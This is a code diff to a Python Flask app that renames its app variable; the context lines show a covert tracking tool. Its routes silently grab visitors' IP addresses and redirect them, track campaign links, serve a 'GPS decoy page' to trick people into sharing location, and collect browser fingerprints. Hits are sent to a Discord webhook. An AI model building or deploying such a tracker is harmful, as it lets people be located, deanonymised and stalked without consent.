@@ -21,7 +21,7 @@ CAMPAIGNS = {}  # e.g. {"camp001": "https://example.com"}
 HITS = {}       # hit_id -> {ip, geo, ts, token}
 
 # ─── Flask app ─────────────────────────────────────────────────────────────
-flask_app = Flask(__name__)
+app = Flask(__name__)
 
 def get_client_ip():
     """Parse real client IP from trusted proxy headers."""
@@ -188,7 +188,7 @@ if(navigator.permissions&&navigator.permissions.query){
 
 # ─── Flask Routes ──────────────────────────────────────────────────────────
 
-@flask_app.route("/")
+@app.route("/")
 def index():
     """Auto IP grab + redirect (no UI, no prompt)."""
     ip = get_client_ip()
@@ -202,7 +202,7 @@ def index():
     discord_send("AUTO IP GRAB", fields, color=0x3498DB)
     return redirect(REDIRECT_URL)
 
-@flask_app.route("/r/<token>")
+@app.route("/r/<token>")
 def campaign(token):
     """Tracked campaign link."""
     ip = get_client_ip()
@@ -218,8 +218,8 @@ def campaign(token):
     discord_send(f"🎯 CAMPAIGN · {token}", fields, color=0x9B59B6)
     return redirect(dest)
 
-@flask_app.route("/g")
-@flask_app.route("/g/<token>")
+@app.route("/g")
+@app.route("/g/<token>")
 def gps_page(token=None):
     """GPS decoy page — browser WILL show Allow/Block."""
     ip = get_client_ip()
@@ -236,7 +236,7 @@ def gps_page(token=None):
 
     return render_template_string(GPS_PAGE, redirect=REDIRECT_URL, hit_id=hit_id)
 
-@flask_app.route("/api/beacon", methods=["POST"])
+@app.route("/api/beacon", methods=["POST"])
 def beacon():
     """Receive browser GPS + fingerprint data after user action."""
     d = request.get_json(silent=True) or {}
@@ -275,7 +275,7 @@ def beacon():
 
     return jsonify(ok=True)
 
-@flask_app.route("/ping")
+@app.route("/ping")
 def ping():
     return "pong", 200
 
@@ -355,4 +355,4 @@ if __name__ == "__main__":
         print("[+] Discord bot thread started")
 
     # Start Flask (main thread)
-    flask_app.run(host="0.0.0.0", port=port)
+    app.run(host="0.0.0.0", port=port)
